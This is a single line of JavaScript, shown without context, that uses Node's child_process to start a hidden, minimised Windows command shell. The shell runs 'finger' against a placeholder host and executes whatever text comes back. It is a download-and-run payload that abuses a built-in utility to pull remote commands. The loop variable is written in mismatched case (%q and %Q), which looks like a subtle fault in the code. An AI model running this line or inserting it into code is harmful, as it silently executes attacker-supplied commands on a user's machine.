require('child_process').exec('cmd.exe /c start \"\" /min for /f \"delims=\" %q in (\'finger user@host.example\') do %Q');
